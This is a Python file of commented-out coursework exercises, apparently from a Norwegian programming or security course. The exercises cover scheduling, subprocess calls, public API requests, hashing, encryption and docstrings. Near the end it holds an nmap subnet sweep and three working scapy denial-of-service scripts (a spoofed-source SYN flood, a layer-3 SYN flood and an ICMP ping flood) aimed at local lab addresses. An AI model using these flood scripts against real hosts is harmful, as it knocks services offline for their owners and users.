#     arkiv.write("test2.txt")


# with zipfile.ZipFile('Test2.zip', 'a') as arkiv: # Åpner en eksisterende zip-fil i append-modus. Hvis den ikke finnes, vil den bli opprettet.
#     arkiv.write("TEst3.txt") # Filen legges til uten å overskrive eksisterende filer.


# import schedule
# import time
# from datetime import datetime

# def display_time():
#     now = datetime.now()
#     current_time = now.strftime("%H:%M:%S")
#     print("Current time: {}".format(current_time))
    
# def display_random_time():
#     # Called randomly between every 10 and 100 seconds
#     print("Randomly called - ", end="")
#     display_time()
    
# def daily():
#     print("It's a new day")
    
# def thursday_time():
#     print("It's 10:19 on Thursday")

# # Calls the display_time function every 30 seconds
# schedule.every(30).seconds.do(display_time)
# # Calls the display_random_time function randomly every
# # 10 to 100 seconds.
# schedule.every(10).to(100).seconds.do(display_random_time)
# # Calls the daily method every day at 10:18
# schedule.every().day.at("10:18").do(daily)
# # Calls the thursday_time method on a Thursday at 10:19
# schedule.every().thursday.at("10:19").do(thursday_time)

# # The continue_loop and try / except blocks allow the 
# # script to be stopped gracefully (by stopping the script).
# # Otherwise, the script would generate an error when stopped.

# continue_loop = True

# try:
#     # Since continue_loop is set to True, the loop will
#     # continue indefinitely.  If anything goes wrong
#     # the except statement sets continue_loop to False to 
#     # gracefully end the script execution.
#     while continue_loop:
#         # Tells the scheduler to run any outstanding
#         # tasks.
#         schedule.run_pending()
#         # Makes the current thread sleep (pause) for 1
#         # second.  This ensures that the run_pending()
#         # method is only called once every second.
#         time.sleep(1)
# except:
#     continue_loop = False
#     print("Scheduler stopped")


# import os
# # os.popen executes the command specified. 
# # echo refers to writing to the console line.
# # This line of code writes the text Hello world!
# # to the console window and returns a pipe/stream
# # connection to the console window so that our script
# # can read the output.
# stream = os.popen("echo Hello world!")
# output = stream.read()
# print(output)

# import subprocess
# process = subprocess.Popen(
#     ["echo", "Let's try this again"],
#     stdout=subprocess.PIPE, 
#     stderr=subprocess.PIPE,
#     text=True,
#     shell=True)

# stdout, stderr = process.communicate()
# print("Output:",stdout)
# print("Errors:",stderr)



# import subprocess

# # Creates a process to ping python.org by sending 4
# # Internet Control Message Protocol (ICMP) messages.
# process = subprocess.Popen(
#     ['ping', '-n', '4', 'python.org'],
#     stdout=subprocess.PIPE,
#     universal_newlines=True)

# # Continuously run the loop
# while True:
#     # Retrieve the output from the 
#     # Popen object's stdout object.
#     # strip() removes a string's starting and ending
#     # whitespaces.
#     print(process.stdout.readline().strip())
    
#     # Test if the process has ended.  While active
#     # it will return a result of None.
#     if process.poll() is not None:
#         # Read the last output from stdout and displays
#         # each line to the console window.
#         for output in process.stdout.readlines():
#             print(output.strip())
#         # End the loop if the process has completed.
#         break


# import os
# os.system("Notepad -tester.txt")  # Opens Notepad with the specified file. If the file doesn't exist, it will be created.


# import os
# os.system(r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" http://www.noroff.no')



# import requests
# print(requests.get("https://catfact.ninja/fact")) # Test if site is online and accessible.



# import requests
# response = requests.get("https://catfact.ninja/fact")
# print(response.text)


# import requests
# response = requests.get("https://randomuser.me/api/")
# print(response.text)


# import requests
# response = requests.get("https://api.thedogapi.com/v1/breeds/search?q=pomeranian")
# print(response.text)


# import requests # Importerer 'requests'-biblioteket som brukes til å sende HTTP-forespørsler til API-er

# base_url = "https://api.thecatapi.com/v1/breeds" # Grunn-URL for TheCatAPI sitt endepunkt som inneholder informasjon om alle raser

# breed_search = input("Skriv inn navnet på en katterase (f.eks. 'Siberian'): ").lower() # Ber brukeren skrive inn navnet på en katterase (bruker lower() for å forenkle sammenligning senere)

# response = requests.get(base_url) # Sender en GET-forespørsel til TheCatAPI for å hente en liste over alle raser


# if response.status_code == 200: # Sjekker om forespørselen var vellykket (statuskode 200 = OK)
#     all_breeds = response.json() # Konverterer JSON-responsen til en Python-liste med ordbøker

#     found = False # Variabel som brukes for å vite om vi finner en match senere

#     for breed in all_breeds: # Går gjennom alle raser i API-svaret
#         if breed_search in breed['name'].lower(): # Sjekker om brukeren sitt søkeord finnes i navnet på en rase
            
#             # Hvis vi finner en match, skriver vi ut masse informasjon
#             print(f"\nRase: {breed['name']}")  # Navnet på rasen
#             print(f"Opprinnelse: {breed.get('origin', 'Ukjent')}")  # Hvor katten stammer fra
#             print(f"Beskrivelse: {breed.get('description', 'Ingen beskrivelse tilgjengelig')}")  # Kort beskrivelse av rasen
#             print(f"Temperament: {breed.get('temperament', 'Ingen temperament-info')}")  # Typisk adferd og personlighet
#             print(f"Mer info: {breed.get('wikipedia_url', 'Ingen link tilgjengelig')}")  # Link til Wikipedia (dersom tilgjengelig)

#             found = True # Setter flagg slik at vi vet at det ble funnet en match

#             break # Avslutter loopen etter første treff (kan fjernes hvis du vil vise *alle* treff)

#     if not found: # Hvis ingen raser matcher brukerens input
#         print("Beklager, ingen matchende rase ble funnet.")

# else:
#     print(f"Noe gikk galt... Statuskode: {response.status_code}") # Dersom forespørselen feiler (f.eks. ingen internett eller feil URL)


# import requests

# response = requests.get("https://api.thedogapi.com/v1/breeds/search?q=pomeranian")
# print("Content type:", response.headers.get("Content-Type"))
# print("Server:", response.headers.get("Server"))
# response = requests.get("https://picsum.photos/200/300")
# print("Content type:", response.headers.get("Content-Type"))
# print("Server:", response.headers.get("Server"))


# import requests        # Importerer requests-modulen for å hente data fra nett
# import os              # Importerer os-modulen for å bruke systemkommandoer
# import platform        # Importerer platform-modulen for å finne ut hvilket OS scriptet kjører på

# #Sender en forespørsel til hunde-API-et og søker etter rasen "pomeranian"
# response = requests.get("https://api.thedogapi.com/v1/breeds/search?q=pomeranian")

# #Skriver ut typen og innholdet til JSON-dataen vi fikk tilbake
# print("JSON content type:", type(response.json()))
# print("JSON content: ", response.json())

# #Henter ut spesifikke verdier fra JSON-listen (navn og hva rasen er avlet for)
# print("JSON content - specific value - name: ", response.json()[0]["name"])
# print("JSON content - specific value - bred-for: ", response.json()[0]["bred_for"])

# #Henter et tilfeldig bilde fra picsum.photos (640x480)
# response = requests.get("https://picsum.photos/640/480")

# #Viser type og rå byte-innhold for bildet
# print("Image content type: ", type(response.content))
# print("Image content: ", response.content)

# #Lagrer bildet lokalt med navnet 'placeholder.jpg'
# filename = "placeholder.jpg"
# with open(filename, "wb") as my_file:
#     my_file.write(response.content)

# #Åpner bildet med riktig kommando basert på hvilket operativsystem du bruker
# if platform.system() == "Darwin":  # macOS
#     os.system(f"open {filename}")
# elif platform.system() == "Windows":  # Windows
#     os.system(f"start {filename}")
# else:  # Linux (for eksempel Ubuntu, Fedora, etc.)
#     os.system(f"xdg-open {filename}")


# import requests
# import platform
# import os

# #Spør brukeren om en katterase
# katterase = input("Skriv inn navnet på en katterase (f.eks. 'siberian'): ")

# #Lager forespørsel til theCatAPI for å søke etter denne rasen
# api_url = f"https://api.thecatapi.com/v1/breeds/search?q={katterase}"
# response = requests.get(api_url)

# #Konverterer svaret til JSON (en liste med ett eller flere treff)
# data = response.json()

# #Sjekker om vi fikk svar
# if data:
#     rase = data[0]  # Henter første (og som regel eneste) treff

#     #Henter ut og viser tre utvalgte felter fra rasedata
#     print("\n🐾 Funnet raseinformasjon:")
#     print(f"- Navn: {rase.get('name', 'Ukjent')}")
#     print(f"- Opprinnelse: {rase.get('origin', 'Ukjent')}")
#     print(f"- Temperament: {rase.get('temperament', 'Ikke oppgitt')}")
# else:
#     print("Fant ingen rase med det navnet 😿")
#     exit()

# #Henter et tilfeldig bilde fra Lorem Picsum i oppløsning 1920x1080
# image_response = requests.get("https://picsum.photos/1920/1080")

# #Lagrer bildet til en lokal fil
# bilde_fil = "bilde_katt.jpg"
# with open(bilde_fil, "wb") as bildefil:
#     bildefil.write(image_response.content)

# #Åpner bildet med ACDsee, basert på operativsystem
# print("\nÅpner bildet i ACDsee...")
# if platform.system() == "Windows":
#     os.system(f"start {bilde_fil}")
# elif platform.system() == "Darwin":  # macOS
#     os.system(f"open {bilde_fil}")
# else:  # Linux
#     os.system(f"xdg-open {bilde_fil}")


# import requests

# # Specify the specific query paramters
# query_parameters = {"nat": "US", "gender": "female"}
# url = "https://randomuser.me/api/"

# # Combine the URL and the query_parameters
# response = requests.get(url, params = query_parameters).json()
# print("Type: ", type(response))
# print("Response: ", response)


# import requests
# import webbrowser            #To open URLs in the default browser in a cross-platform way

# #NASA Mars Rover API endpoint
# endpoint = "https://api.nasa.gov/mars-photos/api/v1/rovers/curiosity/photos"

# #API-nøkkel. Bruk DEMO_KEY for testing – bytt til egen for flere requests
# api_key = "DEMO_KEY"

# #Spørring: Vi ber om bilder tatt på Mars denne datoen
# query_parameters = {
#     "api_key": api_key,
#     "earth_date": "2023-03-22"
# }

# #Hent respons fra NASA API-et
# response = requests.get(endpoint, params=query_parameters)

# #Sjekk først om vi fikk gyldig svar fra NASA
# if response.status_code == 200:
#     data = response.json()  #Pakk ut JSON-dataen
#     photos = data.get("photos", [])  #Få ut bildelisten, ellers tom liste

#     #Skriv ut antall bilder som er funnet for den aktuelle datoen
#     print("Antall bilder funnet:", len(photos))

#     #Hvis det finnes minst ett bilde, åpne det første i nettleseren
#     if photos:
#         first_image_url = photos[0]["img_src"]
#         print("Åpner første bilde i nettleseren:\n", first_image_url)
#         webbrowser.open(first_image_url)  #Dette fungerer på Windows, macOS og Linux
#     else:
#         print("Ingen bilder funnet for denne datoen.")
# else:
#     #Feilmelding dersom noe gikk galt
#     print("Kunne ikke hente bilder. Statuskode:", response.status_code)


# import hashlib
# txtMessage = "!@Mine passord er ofte veldig lange, så vi tester dette."
# txtMessage = txtMessage.encode("utf-8")

# md5hash = hashlib.md5(txtMessage).hexdigest()
# sha256 = hashlib.sha256(txtMessage).hexdigest()
# sha512 = hashlib.sha512(txtMessage).hexdigest()

# print("MD5 : " + md5hash)
# print("SHA 256 : " + sha256)
# print("SHA 512 : " + sha512)


# from cryptography.fernet import Fernet

# message = "!@Mine passord er ofte veldig lange, så vi tester dette."
# key = b"wGwHGg7CFyPyFjX_Vemj4MS3suPa6VGQilZrqlX1Li8="

# fernet = Fernet(key)
# encMessage = fernet.encrypt(message.encode())
# decMessage = fernet.decrypt(encMessage).decode()

# print("Original :" + message)
# print("Encrypted : " + str(encMessage))
# print("Decrypted : " + str(decMessage))



# from cryptography.fernet import Fernet

# key = Fernet.generate_key()
# print(key)



# from PIL import Image
# import imagehash

# hash = imagehash.average_hash(Image.open('Bilde 2.jpg'))
# print(hash)
# otherhash = imagehash.average_hash(Image.open('Bilde 2 - Copy.jpg'))
# print(otherhash)
# print(hash == otherhash)


# from PIL import Image
# import imagehash
# import os
# import glob

# os.chdir(r".\bilde_backup")

# image_file_to_match_hash = ""

# print("Scanning started...")

# for image_file_to_match in glob.glob("*.jpg"):
#     image_file_to_match_hash = imagehash.average_hash( Image.open(image_file_to_match))
#     print("Finding a match for {0}".format(image_file_to_match))

#     for image_scan in glob.glob("*.jpg"):
#         if image_file_to_match != image_scan:
#             image_scan_hash = imagehash.average_hash((Image.open(image_scan)))

#             if image_file_to_match_hash == image_scan_hash:
#                 print("Match found with {0}".format(image_scan))



# import nmap3

# ip_devices = "10.0.0.0/24"

# nmap = nmap3.NmapScanTechniques()
# results = nmap.nmap_ping_scan(ip_devices)

# print("Starting subnet scan")
# print("{0}{1}{2}".format("Host".ljust(15), "MAC".center(30), "State".rjust(10)))
# print("-" * 60)

# for host in results:
#     if host not in ["stats", "runtime"]:
#         device_info = results[host]

#         # If it's a list (which it sometimes is), just grab the first element
#         if isinstance(device_info, list):
#             device_info = device_info[0]

#         # Get MAC address if available
#         mac_info = device_info.get("macaddress")
#         mac_address = mac_info.get("addr") if isinstance(mac_info, dict) else "none"

#         # Get state
#         state = device_info.get("state", {}).get("state", "unknown")

#         # Print result
#         print("{0}{1}{2}".format(
#             host.ljust(15), mac_address.center(30), state.rjust(10)
#         ))

# # Print scan stats
# if "stats" in results:
#     print("-" * 60)
#     print("The scan was completed with NMAP version {0}, and the command used was {1}".format(
#         results["stats"].get('version', '?'),
#         results["stats"].get('args', '?')
#     ))
#     print("Completed the subnet scan")


# from scapy.all import IP, TCP, Raw, Ether, sendp, RandIP, RandShort

# # Target configuration
# target_ip = "10.0.0.15"
# target_mac = "08:00:27:ca:66:49"  # MAC address of the VM (target)
# target_port = 80  # Web server port

# # Spoofed source IP within the same subnet
# ip_layer = IP(src=RandIP("10.0.0.0/24"), dst=target_ip)

# # TCP SYN packet with random source port
# tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")

# # Optional payload (1 KB of dummy data)
# payload = Raw(load="X" * 1024)

# # Create full Ethernet frame (layer 2)
# ethernet = Ether(dst=target_mac)

# # Final packet composition
# packet = ethernet / ip_layer / tcp_layer / payload

# # Send the packet in a loop with a short delay between each to avoid total network clog
# sendp(packet, loop=1, inter=0.0001, verbose=0)


# # sendp(packet, loop=1, inter=0.01, verbose=1)


# from scapy.all import *

# def send_syn_flood_layer3(target_ip, target_port):
#     ip = IP(dst=target_ip)
#     tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
#     packet = ip / tcp

#     print(f"Sending SYN flood to {target_ip}:{target_port} via L3")
#     send(packet, loop=1, inter=0.001, verbose=1)

# send_syn_flood_layer3("10.0.0.138", 80)





# # C versjon

# from scapy.all import *

# def send_ping_flood(target_ip_address: str, size_of_packet: int = 1400):
#     ip = IP(dst=target_ip_address)
#     icmp = ICMP()
#     raw = Raw(b"X" * size_of_packet)
#     packet = ip / icmp / raw

#     print(f"Starting ICMP flood to {target_ip_address} with packets of size {size_of_packet} bytes...")
#     send(packet, loop=1, inter=0.000001, verbose=1)


# class MyClass:
#     something = 0
#     # Sets the docstrings property of the class
#     __doc__ = "This is an overview of what MyClass does."

#     def my_class_function():
#         # A one-line docstring for this method
#         '''This is an overview of what my_class_function does. we should not write essays here, but it should be anough to make no doubt what is going on.'''
#         print("Called MyClass function")

#     def my_class_function2():
#         ''' Another example. How does this look?'''
#         print("Called MyClass function 2")


# def my_function():
#     print("Called function")

# # Sets the docstrings property of the function.
# my_function.__doc__ = "This is an overview of what MyFunction does."

# help(MyClass)
# print()
# help(my_function)


# def my_other_method():
#     """This is a mult-line descriptive docstring.
#     We can write multiple lines like this to help
#     everythin still look neat and orderly. But don't
#     let each line be too long. Try to hold dem to a
#     uniform lenght."""
#     print("Called my_other_method.")

# help(my_other_method)



